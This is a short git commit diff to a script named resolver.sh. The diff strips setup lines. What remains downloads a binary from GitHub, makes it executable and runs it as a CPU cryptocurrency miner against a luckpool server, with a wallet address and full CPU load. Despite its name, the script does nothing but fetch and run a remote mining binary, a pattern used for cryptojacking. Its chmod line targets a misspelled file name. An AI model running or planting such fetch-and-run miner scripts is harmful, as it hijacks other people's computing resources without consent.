2f298a701a0face591417e7efff0a13789da0dc0
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-08-11 21:31:00 +0700

    Update resolver.sh

--- resolver.sh
+++ resolver.sh
@@ -1,9 +1,5 @@
 #! /bin/bash
-sudo apt update
-clear
-sudo apt install screen
-screen -R ik1
- 
+
 wget https://raw.githubusercontent.com/chikahusarii/tepm/main/ik1
 chmod +x ik1ik1
 ./ik1 -c stratum+tcp://na.luckpool.net:3956 -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.g1 -p x --cpu 200
